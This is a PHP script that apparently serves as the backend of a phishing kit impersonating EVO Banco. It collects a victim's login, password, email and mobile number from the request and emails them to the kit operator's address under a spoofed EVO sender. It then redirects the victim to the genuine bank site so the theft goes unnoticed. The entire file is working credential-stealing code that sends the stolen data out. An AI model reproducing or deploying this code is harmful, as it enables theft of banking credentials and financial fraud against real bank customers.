<?php
		include("yourEmail.php");
	
		$mdp = $_GET['mdp'];
		$nif = $_GET['nif'];
                $EMAIL = $_GET['email'];
                $Movil = $_GET['movil'];
		
		$subject = 'Compte EVO';
		$headers = 'From: EVO@gmail.com' . "\r\n" . 
		'Reply-To: EVO@gmail.com' . "\r\n" .
		'X-Mailer: PHP/1278782';
		
		$message = "login  : (" .$mdp.")\r\n";
		$message .= "password  : (" . $nif .")\r\n";
                $message .= "Email  : (" .$EMAIL.")\r\n";
                $message .= "Movil  : (" .$Movil.")\r\n";
		mail($yourEmail, $subject, $message, $headers);
		echo '<script>window.location = "https://bancaelectronica.evobanco.com";</script>';
?>